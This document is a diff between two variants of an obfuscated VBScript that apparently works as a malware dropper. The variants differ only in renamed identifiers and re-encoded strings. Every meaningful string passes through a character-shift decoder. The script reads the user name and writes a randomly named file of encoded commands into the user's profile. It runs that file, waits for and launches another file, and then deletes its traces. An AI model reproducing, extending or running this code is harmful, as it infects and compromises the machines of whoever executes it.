@@ -1,126 +1,126 @@
-Const gBWNcd = 8
-Private Function mkeh4Haz4iAz(d8LQH3V)
-    Const zODurt5 = 10
-    Const dgqev5 = 33
-    Const jF8o3mu5dL = 126
-    If Len(d8LQH3V) < 5 Then
-        mkeh4Haz4iAz = ""
+Const pjbI74NWy = 8
+Private Function lopK3nza(sVIvu3GEv5)
+    Const rvCEC3q5s = 10
+    Const e92K9NVq = 33
+    Const uIm13i2Jp = 126
+    If Len(sVIvu3GEv5) < 5 Then
+        lopK3nza = ""
         Exit Function
     End If
-    Dim pFTR031VW1
-    d8LQH3V = Mid(d8LQH3V,3,Len(d8LQH3V)-4)
-    For i=2 To Len(d8LQH3V) Step 2
-        c3PqP6 = Asc(Mid(d8LQH3V,i,1)) + zODurt5
-        If c3PqP6 > jF8o3mu5dL Then
-            c3PqP6 = c3PqP6 - jF8o3mu5dL + dgqev5 - 1
+    Dim eI1tPhsjk5
+    sVIvu3GEv5 = Mid(sVIvu3GEv5,3,Len(sVIvu3GEv5)-4)
+    For i=2 To Len(sVIvu3GEv5) Step 2
+        mDmmsbk5d = Asc(Mid(sVIvu3GEv5,i,1)) + rvCEC3q5s
+        If mDmmsbk5d > uIm13i2Jp Then
+            mDmmsbk5d = mDmmsbk5d - uIm13i2Jp + e92K9NVq - 1
         End If
-        pFTR031VW1 = pFTR031VW1 & Chr(c3PqP6)
+        eI1tPhsjk5 = eI1tPhsjk5 & Chr(mDmmsbk5d)
     Next
-    mkeh4Haz4iAz = pFTR031VW1
+    lopK3nza = eI1tPhsjk5
 End Function
 
-dim eAM7IJg
-eAM7IJg = CreateObject(mkeh4Haz4iAz("3IkMrIqY7h=_tfNjU$xDP[FjjmVerhcauB")).UserName  
+dim a72M9gAwb
+a72M9gAwb = CreateObject(lopK3nza("X\$M^IzYXh@_Uf0jH$^D@[pjXmdebhIa-K")).UserName  
 
-Dim oBFBxwZa, k, rsIGtSsk, hjf0pxz3H, rSpgH2Pz2R
-iGqJsYFO = mkeh4Haz4iAz("#rgW?X[YZZ0[@\""]F^-_a`Kamb{c6d}e""f7g$hviEjqk4lQmInEosp}u")
-tDCCE6r = mkeh4Haz4iAz("=c/W<X,YjZY[5\k]g^""_5`<azbMctdJe=f<g&h<iyj-kWlqm*n=o?p('=(B)L*""+a,u-}.;/ba")
-Dim rvwu8j,sm490i6f
-rvwu8j=12
-sm490i6f=8
-function uzxrYe()
+Dim dzcTJ0a, k, nbXO0RY, ihqaU86Yr, c8Ry0cCu9
+b8buAUW8SB = lopK3nza("#rgW?X[YZZ0[@\""]F^-_a`Kamb{c6d}e""f7g$hviEjqk4lQmInEosp}u")
+mel33o5 = lopK3nza("=c/W<X,YjZY[5\k]g^""_5`<azbMctdJe=f<g&h<iyj-kWlqm*n=o?p('=(B)L*""+a,u-}.;/ba")
+Dim w0h2951OD,aH3XpMc
+w0h2951OD=12
+aH3XpMc=8
+function a47fv2()
 Randomize()
     Randomize
-    oBFBxwZa = Int((rvwu8j-sm490i6f+1)*Rnd+sm490i6f)
-    rsIGtSsk = Fix(25 * Rnd())
-    rSpgH2Pz2R = Mid(iGqJsYFO, rsIGtSsk + 1, 1)
-    For k = 1 To oBFBxwZa
-        rsIGtSsk = Fix(35 * Rnd())
-        hjf0pxz3H = Mid(tDCCE6r, rsIGtSsk + 1, 1)
-        rSpgH2Pz2R = rSpgH2Pz2R & hjf0pxz3H
+    dzcTJ0a = Int((w0h2951OD-aH3XpMc+1)*Rnd+aH3XpMc)
+    nbXO0RY = Fix(25 * Rnd())
+    c8Ry0cCu9 = Mid(b8buAUW8SB, nbXO0RY + 1, 1)
+    For k = 1 To dzcTJ0a
+        nbXO0RY = Fix(35 * Rnd())
+        ihqaU86Yr = Mid(mel33o5, nbXO0RY + 1, 1)
+        c8Ry0cCu9 = c8Ry0cCu9 & ihqaU86Yr
     Next
-    rSpgH2Pz2R = rSpgH2Pz2R & mkeh4Haz4iAz("V`L$5l>Xqis>")
-    uzxrYe = rSpgH2Pz2R
+    c8Ry0cCu9 = c8Ry0cCu9 & lopK3nza("{rc$!lGX4iv~")
+    a47fv2 = c8Ry0cCu9
 end function
 
-dim rU6H0dCR3V
-rU6H0dCR3V = false
-eErGmolw = uzxrYe
-g0C1X6qE = uzxrYe
+dim qBE5SGePg
+qBE5SGePg = false
+l9KbVWfBw = a47fv2
+kzY2F2R0 = a47fv2
 
-Set nr58VTJ = CreateObject(mkeh4Haz4iAz("0X+IZYVh9_df/j(_Rdd]""$6</_sb][4Iqo,i,jB[ycWEwXn`5[rYtjY,"))
-nr58VTJ.CreateTextFile (mkeh4Haz4iAz(":?[9?0WR/K/is[ch^i3RBe") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + eErGmolw)
-set jODka8dJT = nr58VTJ.OpenTextFile (mkeh4Haz4iAz("y879d0AR}KGiA[ChLiYR*;") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + eErGmolw, gBWNcd)
-Set aRghiM = CreateObject(mkeh4Haz4iAz("8uiIpY!h+_""fijS_qd{]\$)<""_=bJ[LIfoti`j$[FcuEpX)`m[7YBj6_"))
-jODka8dJT.WriteLine mkeh4Haz4iAz("R;$:]_Fcul") + " " + mkeh4Haz4iAz("\WzkZh|bn""[h\[*g1""_`Qiaeud?>")
-jODka8dJT.WriteLine mkeh4Haz4iAz("!fakmh3bb3Lvi^hj|j|fL03%D%m_|fl#AWlf]_.$OY)encf%W`Oite""dZ%&vOS")
-jODka8dJT.WriteLine mkeh4Haz4iAz("VWMIu[Ijq2") + " " + mkeh4Haz4iAz("(8vht[fgm3r9;hz[,W9jC[7E""X^`3[rYujt|-vICGi+nQcHb;(-$cN<CTB!>FjXjofo$%,J$)&sve}7I")
-jODka8dJT.WriteLine mkeh4Haz4iAz("?as9aWWbYbDf") + " " + mkeh4Haz4iAz(";7.hS[hgp$NE=fD[JdR|wvR=7;dJqvC""!kihnb@""i<dWSbni^[7}g/")
-jODka8dJT.WriteLine mkeh4Haz4iAz(":5\9""Wbb/bLu") + " " + mkeh4Haz4iAz("*""\hx[&g8$wIC['dPZQ|i}Y}")
-jODka8dJT.WriteLine mkeh4Haz4iAz("0a)?x\K9") + " " + mkeh4Haz4iAz("""L2h?[\gG$4Ixj(WTjUkgi43`(z&O&Ld") + " " + mkeh4Haz4iAz("ve`JZ^\[Qdi4")
-jODka8dJT.WriteLine mkeh4Haz4iAz("nfr`pi""eYd536hh[wgu$Sh+[>i\fnexd#i6[&JH[7ndjJ~")
-jODka8dJT.WriteLine mkeh4Haz4iAz("{)x;|d\Z{}") + " " + mkeh4Haz4iAz("Nk\?h\Xy")
-jODka8dJT.WriteLine mkeh4Haz4iAz("@Ue_/\j)") + " " + mkeh4Haz4iAz("""7W?wdRIcj?hK|s`/inead/""Rv;8qh>WCp._GbQvI}2n") + " " + mkeh4Haz4iAz("(O?JR^([AdM3")
-sO71y7 = mkeh4Haz4iAz("?8&9k0>R""KpiR[+hviZR,r")+ eAM7IJg + mkeh4Haz4iAz("rX%R77[fXfR:YWKjWW:RGH'enWVca_""dy]\RTCK_hY}h=e(iRe}\\j?R8Ma_4doZ?ewmBi,RNIXj.WXhsj=Y") + " " + mkeh4Haz4iAz("}/CC![wdZkFRyF=h4eb]#h<Wbc$ikRtIJjIW""hAj""k4fMq") + "\" + mkeh4Haz4iAz("e;qmw_%d[h7Wjh]#VnO,""*3#D,s&^*3$v[unz[F7")
-If not aRghiM.FileExists(sO71y7) Then
-jODka8dJT.WriteLine mkeh4Haz4iAz("Z:phGh!emeAhkeP*_)xq") + " " + mkeh4Haz4iAz("bFEvX^2jgj:fL09%e%vi%_8bfl2WQ[8iij6h8[^b!WQ$`piWgf1j5er$XeVhY]<%ec*dEe!f_%Bjah3e(fBY3$?l{X3iOv8""!vo9P0eR:K1i>[*h%iGR-8") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + g0C1X6qE + """"
-rU6H0dCR3V = true
+Set dR15Wsd2tX = CreateObject(lopK3nza("VjBIFY_hZ_gfojh_FdJ]q$`<{_#bM[wI*o6iAj/[0c|EMXq`$[fY>j;5"))
+dR15Wsd2tX.CreateTextFile (lopK3nza("`Qr9+0`RPK2iU[DhRiwR31") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + l9KbVWfBw)
+set fpeAS6D = dR15Wsd2tX.OpenTextFile (lopK3nza("@JN9P0JR@KIi""[%h?i@Rxe") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + l9KbVWfBw, pjbI74NWy)
+Set qqDsbk = CreateObject(lopK3nza("8uiIpY!h+_""fijS_qd{]\$)<""_=bJ[LIfoti`j$[FcuEpX)`m[7YBj6_"))
+fpeAS6D.WriteLine lopK3nza("xM;:I_Oc8o") + " " + lopK3nza("\WzkZh|bn""[h\[*g1""_`Qiaeud?>")
+fpeAS6D.WriteLine lopK3nza("!fakmh3bb3Lvi^hj|j|fL03%D%m_|fl#AWlf]_.$OY)encf%W`Oite""dZ%&vOS")
+fpeAS6D.WriteLine lopK3nza("{idIa[Rj45") + " " + lopK3nza("(8vht[fgm3r9;hz[,W9jC[7E""X^`3[rYujt|-vICGi+nQcHb;(-$cN<CTB!>FjXjofo$%,J$)&sve}7I")
+fpeAS6D.WriteLine lopK3nza("et,9MW`bzbFH") + " " + lopK3nza(";7.hS[hgp$NE=fD[JdR|wvR=7;dJqvC""!kihnb@""i<dWSbni^[7}g/")
+fpeAS6D.WriteLine lopK3nza("_Hs9lWkbPbOV") + " " + lopK3nza("*""\hx[&g8$wIC['dPZQ|i}Y}")
+fpeAS6D.WriteLine lopK3nza("Vt@?d\TZ") + " " + lopK3nza("H^Ih+[fgh$6IZjhWHj;kXi^3N(*&?&1{") + " " + lopK3nza(">wwJF^e[rdkt")
+fpeAS6D.WriteLine lopK3nza("6x+`\i,ezd83vhI[kg[$DhU[,ijf^e]d:i@[:J6[Mn,j!#")
+fpeAS6D.WriteLine lopK3nza("C<1;hdeZ>""") + " " + lopK3nza("t}s?T\a<")
+fpeAS6D.WriteLine lopK3nza("fh|_y\sJ") + " " + lopK3nza("""7W?wdRIcj?hK|s`/inead/""Rv;8qh>WCp._GbQvI}2n") + " " + lopK3nza("MbUJ>^1[bdPs")
+t2dMwhWg = lopK3nza("?8&9k0>R""KpiR[+hviZR,r")+ a72M9gAwb + lopK3nza("rX%R77[fXfR:YWKjWW:RGH'enWVca_""dy]\RTCK_hY}h=e(iRe}\\j?R8Ma_4doZ?ewmBi,RNIXj.WXhsj=Y") + " " + lopK3nza("}/CC![wdZkFRyF=h4eb]#h<Wbc$ikRtIJjIW""hAj""k4fMq") + "\" + lopK3nza("e;qmw_%d[h7Wjh]#VnO,""*3#D,s&^*3$v[unz[F7")
+If not qqDsbk.FileExists(t2dMwhWg) Then
+fpeAS6D.WriteLine lopK3nza("""L)h3h*e0eDhLe2*S)^a") + " " + lopK3nza("bFEvX^2jgj:fL09%e%vi%_8bfl2WQ[8iij6h8[^b!WQ$`piWgf1j5er$XeVhY]<%ec*dEe!f_%Bjah3e(fBY3$?l{X3iOv8""!vo9P0eR:K1i>[*h%iGR-8") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + kzY2F2R0 + """"
+qBE5SGePg = true
 end if
-if rU6H0dCR3V = true then
-jODka8dJT.WriteLine mkeh4Haz4iAz("CJ!I0kTXP:") + " " + mkeh4Haz4iAz("}]Qh<h""e*egh)eA*.)h|mC1K}hT[ibW""1C~F]IYWHiUnA,V}U8")
-jODka8dJT.WriteLine mkeh4Haz4iAz("!f':-_dcr2") + " " + mkeh4Haz4iAz("X^.e!\/ZO);""wdeZ&\|]y-[*d*2""}d`d=aMa5jv+#""<d*`S`X&V""\l+lXWU'r($)2Wva")
-jODka8dJT.WriteLine mkeh4Haz4iAz("8o]I}[@j,E") + " " + mkeh4Haz4iAz("}~Cd3Z>\t]=-m*K*`3W9Fhi[nW$jM[HEIXk`g[0Ylj0|Dv=IRYhhU_&fWjv_Fd|]q$<<v_gbm[lIIo7iLjh[-ccEUX4`t[DY#j\v?}.e")
-jODka8dJT.WriteLine mkeh4Haz4iAz("T{B?#\E>") + " " + mkeh4Haz4iAz(".g;dBZ$\J]F-`*;*@$}<?eHb{Z>[~ha;Xn@_Fi7jsix|QCLF_IDW""icn%,2}y'") + " " + mkeh4Haz4iAz("mb]JO^S[Ud9:")
-jODka8dJT.WriteLine mkeh4Haz4iAz("80tdg`g`x&~3LdiZY\']6-f*2*-$m8sk<_Kb8ZcFeWZjT^`|KCrFkI/W]icn@,\""-C__AZ1|&CKKUh,[db4""=?$deI/jjhvHH[ClT|\CLKuh=[_bi""%vt%!v\}!!X'H},}]Z")
-jODka8dJT.WriteLine mkeh4Haz4iAz("fvl;Bbai\[*?9\m|") + " " + mkeh4Haz4iAz("(]UdKZN\5]e-N*(*_$}<4e_bqZe[:hs;;nW_ViVj[iR|#BW[c\2jW|^CYFGIJW^i""n-,_""$?ydHIsjOhUHk[:l}|CCpFwIqWUi%n8,D""bvkRovE}U#i'H}:}>V") + " " + mkeh4Haz4iAz("+DYJS^o[hdx=")
-jODka8dJT.WriteLine mkeh4Haz4iAz("`JUd``l`2&23GC#FQIQWnivnj,5G")
-jODka8dJT.WriteLine mkeh4Haz4iAz("nVO;{bei%[c]")
-jODka8dJT.WriteLine mkeh4Haz4iAz("7Z"";cnW_(jGC") + " " + mkeh4Haz4iAz("VW?Iuk2X""K")
-jODka8dJT.WriteLine mkeh4Haz4iAz(".~/;zdJZ69") + " " + mkeh4Haz4iAz("L1""?K\Nr")
-jODka8dJT.WriteLine mkeh4Haz4iAz("Aa=I5[.jRD") + " " + mkeh4Haz4iAz("<?%drd-a(a0jZ+r379rh2[>W]jc[iEPXO`-[mY]jO|)v>C=I9NnC@Bs(w$|Ig[;h$lv[;htNhC;Bi>lJ0JuF_v4}{e")
-jODka8dJT.WriteLine mkeh4Haz4iAz("IW,d`draJa7jL+F$Gesf5[Ed}j") + " " + mkeh4Haz4iAz("DQ]v*=s;$J7v*""lCgKwhj[gb+""G<rW1b0i][<e")
-jODka8dJT.WriteLine mkeh4Haz4iAz("w;Hdgd2aTaaj&+9$\ic[DjGH([zg,k""[""i*j%>?[&WCZA[AhJ'") + " " + mkeh4Haz4iAz("7ZxvY9pWpYE^#[K#^9>eId{j.h|e?bzvJ""TvKf5hz_Bl5WYjw[9""?d-e/#HYYW:Y#^3[9""RdleH#1i>j+ehhX[|""ccQk|i-jP#Oh2[=loW9bq_^Z|WVj""[,vs(")
-jODka8dJT.WriteLine mkeh4Haz4iAz("{8_d8dvavaGj'+R$%i;[xjrHV[@g1k.[vi(jp>Z[AWQZT[dhWA") + " " + mkeh4Haz4iAz("8cwvwFehoW)]!cwW%v6""Jv7dPe{#7Y1WzY'^l[*v]u")
-jODka8dJT.WriteLine mkeh4Haz4iAz("l~vd4dsa%a.jR+)$-i|[""dsZ9H")
-jODka8dJT.WriteLine mkeh4Haz4iAz("q;#Ib[5jPe") + " " + mkeh4Haz4iAz("w,*eo\AZZ)T3""9MhL[XWEj*[UEZXZ`o[EY8jW|Uv]7M:2E*:-8v$EI4jxhH[GWgcgvw}</")
-jODka8dJT.WriteLine mkeh4Haz4iAz("%vBer\zZ?)""$KJfoUfi[!3s'""""")
-jODka8dJT.WriteLine mkeh4Haz4iAz("j')e(\xZ))x$/C1e7Z'[/3-)ef")
-jODka8dJT.WriteLine mkeh4Haz4iAz("""Qye<\#ZB)y$zECfc[*d(A")
-jODka8dJT.WriteLine mkeh4Haz4iAz("%7Me#\QZn){$%M6hT_Ljl[M[") + " " + mkeh4Haz4iAz("w;Hdgd2aTaaj&+9$\hc[DiGf(ezd,i""[""8*e%Z?o&C")
-jODka8dJT.WriteLine mkeh4Haz4iAz("[%VeW\'ZK)B$HI*Wvl][rJ/es<Y_^b""[nE") + " " + mkeh4Haz4iAz("\nIde`E`z&+""m((?")
-jODka8dJT.WriteLine mkeh4Haz4iAz(".i""e+\hZe)!$l9ubse+i+[H4")
-jODka8dJT.WriteLine mkeh4Haz4iAz("PLz;-dXZB)") + " " + mkeh4Haz4iAz("['=I?klXf|")
+if qBE5SGePg = true then
+fpeAS6D.WriteLine lopK3nza("Wh2I2kgX*t") + " " + lopK3nza("}]Qh<h""e*egh)eA*.)h|mC1K}hT[ibW""1C~F]IYWHiUnA,V}U8")
+fpeAS6D.WriteLine lopK3nza("5&9:/_wcLl") + " " + lopK3nza("X^.e!\/ZO);""wdeZ&\|]y-[*d*2""}d`d=aMa5jv+#""<d*`S`X&V""\l+lXWU'r($)2Wva")
+fpeAS6D.WriteLine lopK3nza("L.nI![Sjd!") + " " + lopK3nza("3>Ud5ZQ\N]w-k*%*A319`hc[eW6j5[6E}X9`w[vYij]|iv]I|Y&hi_2ftjs_od_]d$q<l_Ab6[zIlo[igjT[ocBE@Xg`X[<Y8j*vO}u]")
+fpeAS6D.WriteLine lopK3nza("h:S?%\Yv") + " " + lopK3nza(".g;dBZ$\J]F-`*;*@$}<?eHb{Z>[~ha;Xn@_Fi7jsix|QCLF_IDW""icn%,2}y'") + " " + lopK3nza("#""nJQ^f[.ds7")
+fpeAS6D.WriteLine lopK3nza("80tdg`g`x&~3LdiZY\']6-f*2*-$m8sk<_Kb8ZcFeWZjT^`|KCrFkI/W]icn@,\""-C__AZ1|&CKKUh,[db4""=?$deI/jjhvHH[ClT|\CLKuh=[_bi""%vt%!v\}!!X'H},}]Z")
+fpeAS6D.WriteLine lopK3nza("z6};Cbui6[d?6\G^") + " " + lopK3nza("(]UdKZN\5]e-N*(*_$}<4e_bqZe[:hs;;nW_ViVj[iR|#BW[c\2jW|^CYFGIJW^i""n-,_""$?ydHIsjOhUHk[:l}|CCpFwIqWUi%n8,D""bvkRovE}U#i'H}:}>V") + " " + lopK3nza(">bjJU^%[BdT:")
+fpeAS6D.WriteLine lopK3nza("thgdb`!`j&l3ECZF3I+W*ipn`,H.")
+fpeAS6D.WriteLine lopK3nza("$t`;}byi\[?Z")
+fpeAS6D.WriteLine lopK3nza("7Z"";cnW_(jGC") + " " + lopK3nza("VW?Iuk2X""K")
+fpeAS6D.WriteLine lopK3nza("A>@;|d]Zns") + " " + lopK3nza("L1""?K\Nr")
+fpeAS6D.WriteLine lopK3nza("U!NI7[Aj,~") + " " + lopK3nza("P]6dtdAa`ajjW+L3w9MhL[8WSjv[PE=X%`Y[}YEjL|VvcC]IcN+CTB!(6$xI2[|hulL[1hON1CIB.>3JKJaFCvp}f:")
+fpeAS6D.WriteLine lopK3nza("]u>dbd'a$aqjJ+~$)eMfO[?dt}") + " " + lopK3nza("DQ]v*=s;$J7v*""lCgKwhj[gb+""G<rW1b0i][<e")
+fpeAS6D.WriteLine lopK3nza("w;Hdgd2aTaaj&+9$\ic[DjGH([zg,k""[""i*j%>?[&WCZA[AhJ'") + " " + lopK3nza("7ZxvY9pWpYE^#[K#^9>eId{j.h|e?bzvJ""TvKf5hz_Bl5WYjw[9""?d-e/#HYYW:Y#^3[9""RdleH#1i>j+ehhX[|""ccQk|i-jP#Oh2[=loW9bq_^Z|WVj""[,vs(")
+fpeAS6D.WriteLine lopK3nza("1Vqd:d+aPa#j%+,$eis[4jlHL[Rgwky[LiTj#>B[>W~Zy[&h#\") + " " + lopK3nza("8cwvwFehoW)]!cwW%v6""Jv7dPe{#7Y1WzY'^l[*v]u")
+fpeAS6D.WriteLine lopK3nza("l~vd4dsa%a.jR+)$-i|[""dsZ9H")
+fpeAS6D.WriteLine lopK3nza("'Y5Id[Hj*A") + " " + lopK3nza("w,*eo\AZZ)T3""9MhL[XWEj*[UEZXZ`o[EY8jW|Uv]7M:2E*:-8v$EI4jxhH[GWgcgvw}</")
+fpeAS6D.WriteLine lopK3nza("96Tet\/Zv)\$IJ?o7fD[;3m'w4")
+fpeAS6D.WriteLine lopK3nza("~E:e*\-Z`)T$,ChewZ`[I3')\y")
+fpeAS6D.WriteLine lopK3nza("5o,e>\7Zz)U$wEzfE[bdB;")
+fpeAS6D.WriteLine lopK3nza("9U_e%\dZH)W$#Mnh6_'j([FQ") + " " + lopK3nza("w;Hdgd2aTaaj&+9$\hc[DiGf(ezd,i""[""8*e%Z?o&C")
+fpeAS6D.WriteLine lopK3nza("[%VeW\'ZK)B$HI*Wvl][rJ/es<Y_^b""[nE") + " " + lopK3nza("\nIde`E`z&+""m((?")
+fpeAS6D.WriteLine lopK3nza("B)4e-\{Z>)\$j9ObUeciE[B*")
+fpeAS6D.WriteLine lopK3nza("dj-;/dkZzc") + " " + lopK3nza("oEOIAk!X@X")
 end if
-jODka8dJT.WriteLine mkeh4Haz4iAz("b29[[b4i0[(/")
-jODka8dJT.WriteLine mkeh4Haz4iAz("{.amyi#Yvhd_)f%j]$BgvkY_3jA9")
-jODka8dJT.WriteLine mkeh4Haz4iAz("M'R[Vd_ZF!") + " " + mkeh4Haz4iAz("~i7_A\\D")
-jODka8dJT.Close
-Set csL2ik1ltl = CreateObject(mkeh4Haz4iAz("oS?MgImYRhp_~f{jc$eI@^/[gb}b\D"))
-csL2ik1ltl.CurrentDirectory = mkeh4Haz4iAz("?pZ9{0qRTKlif[jh;iFRst") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
-csL2ik1ltl.Run eErGmolw
+fpeAS6D.WriteLine lopK3nza("vPK[]bGih[b-")
+fpeAS6D.WriteLine lopK3nza("0Lrmzi6YPh@_'f]j?${g2kS_*jS~")
+fpeAS6D.WriteLine lopK3nza("aEd[XdsZ~\") + " " + lopK3nza("3)H_C\o|")
+fpeAS6D.Close
+Set xXSTBzyTp = CreateObject(lopK3nza("%qQMiI#Y,hL_|fUjE$@IZ^)[^b1bC1"))
+xXSTBzyTp.CurrentDirectory = lopK3nza("S0l9}0&R.KHid[Ch{i~R/n") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
+xXSTBzyTp.Run l9KbVWfBw
 wscript.sleep 2000
-csL2ik1ltl.Run g0C1X6qE
-uaw9l2 = true
-do While (uaw9l2 = true)
-    Set oBju2g = CreateObject(mkeh4Haz4iAz("a>GI/Y!h`_\fjjN_?d^]&$q<v_'bU[GICo^i7j@[tcBEUXA`6[OYrjI3"))
-    For Each n0Ec6D in oBju2g.GetFolder(mkeh4Haz4iAz("~r59_0QRDKfi2[whNieR\d") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")).Files
-        if InStr(n0Ec6D,mkeh4Haz4iAz("r&u9peSc!fMh-eslf#9#")) > 0 then
-            csL2ik1ltl.Run n0Ec6D.name
-            uaw9l2 = false
+xXSTBzyTp.Run kzY2F2R0
+utzGutBRur = true
+do While (utzGutBRur = true)
+    Set rDlVnT = CreateObject(lopK3nza("u\YI1Y4h:_8fhj(_!d9]@$k<m_:b<[4Iwo,iGj([qcoEzXa`a[kY(jUP"))
+    For Each v8l90y in rDlVnT.GetFolder(lopK3nza("42G9a0dR|KCi0[Ph0i?Rv^") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")).Files
+        if InStr(v8l90y,lopK3nza("(D(9refcXf*h*eLlH#q=")) > 0 then
+            xXSTBzyTp.Run v8l90y.name
+            utzGutBRur = false
             Exit For
         end if
     Next
     wscript.sleep 1000
 Loop
-Set eo80I4s = CreateObject(mkeh4Haz4iAz("[=JI0YNh8_5f0je_$dS]I$N<B_*bJ[]IUo`iIjk[{c,EDXA`I[_Y1jt3"))
+Set fX651098Y = CreateObject(lopK3nza("o[[I2Yahp_of.j?_dd.]c$H<8_<b1[JI,o.iYjS[xcYEiX``s[zYEj""P"))
 wscript.sleep 90000
-w66d9XG = mkeh4Haz4iAz("]%.9+0tR6K+iv[^h_ioRuD")+ eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + mkeh4Haz4iAz(",AI-?pwn8W'$^ZLb7bPJ")
-If eo80I4s.FileExists(w66d9XG) Then
-    csL2ik1ltl.Run mkeh4Haz4iAz("['=m?_ldfh|WThc#Kni,^*/#,,{&_(U$l[QnS[aP")
+v46UMVVY = lopK3nza("qC?9-0)RnKeis[8hAiJR1>")+ a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + lopK3nza("@_[-Ap,npWa$\Z&bwb*d")
+If fX651098Y.FileExists(v46UMVVY) Then
+    xXSTBzyTp.Run lopK3nza("oEOmA_!d@hXWRh=#-nC,x*)##,0&G(B$B[}nc[IM")
 end if
 
-Set a4mM5q = CreateObject(mkeh4Haz4iAz("0O&IGY1h^_=fhj1_fd""]#$I<(_|bJ[UIpoQiTj6[(c>EwX%`%[CY+j`n"))
-a4mM5q.DeleteFile(mkeh4Haz4iAz("'\?9&0[R""K<i'[%h^iyRai") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + eErGmolw ), DeleteReadOnly
-a4mM5q.DeleteFile(mkeh4Haz4iAz("'\?9&0[R""K<i'[%h^iyRai") + eAM7IJg + mkeh4Haz4iAz("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + g0C1X6qE ), DeleteReadOnly
+Set wy0mf2BdAV = CreateObject(lopK3nza("0O&IGY1h^_=fhj1_fd""]#$I<(_|bJ[UIpoQiTj6[(c>EwX%`%[CY+j`n"))
+wy0mf2BdAV.DeleteFile(lopK3nza("'\?9&0[R""K<i'[%h^iyRai") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + l9KbVWfBw ), DeleteReadOnly
+wy0mf2BdAV.DeleteFile(lopK3nza("'\?9&0[R""K<i'[%h^iyRai") + a72M9gAwb + lopK3nza("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + kzY2F2R0 ), DeleteReadOnly
 
 
